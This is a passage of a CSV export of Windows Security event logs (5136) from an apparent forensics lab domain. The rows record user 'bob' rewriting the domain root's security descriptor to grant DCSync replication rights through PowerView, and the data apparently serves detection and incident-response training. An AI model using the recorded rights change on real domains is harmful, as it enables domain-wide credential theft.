-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
25,198242602,2019-03-25 21:28:45.0266303,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""98e50f6a-ae61-4bff-a9f0-ccfa5ccb555c""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
26,198242603,2019-03-25 21:28:45.0266303,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,2,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""98e50f6a-ae61-4bff-a9f0-ccfa5ccb555c""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
27,198242604,2019-03-25 21:28:45.0266303,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,2,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9f3dcf8f-49df-4db9-aa5f-09b804addd96""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
28,198242605,2019-03-25 21:28:45.0266303,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,2,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""9f3dcf8f-49df-4db9-aa5f-09b804addd96""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1